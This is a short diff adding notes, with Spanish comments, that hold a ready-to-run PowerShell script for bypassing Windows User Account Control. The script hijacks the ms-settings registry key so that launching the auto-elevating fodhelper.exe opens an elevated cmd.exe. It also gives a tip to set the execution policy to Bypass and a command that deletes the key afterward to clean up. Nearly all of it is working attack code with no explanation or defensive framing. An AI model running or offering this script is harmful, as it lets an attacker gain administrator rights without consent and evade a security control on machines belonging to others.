@@ -1,0 +1,28 @@
+```
+notepad bypass_uac.ps1
+
+
+# Crear clave de hijacking en el registro
+New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
+
+# Lanzar fodhelper (autoElevate)
+Start-Process "fodhelper.exe"
+
+
+.\bypass_uac.ps1
+
+SOLO SI DA ERROR
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+
+```
+
+
+```
+Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
+
+.\clean_uac.ps1
+
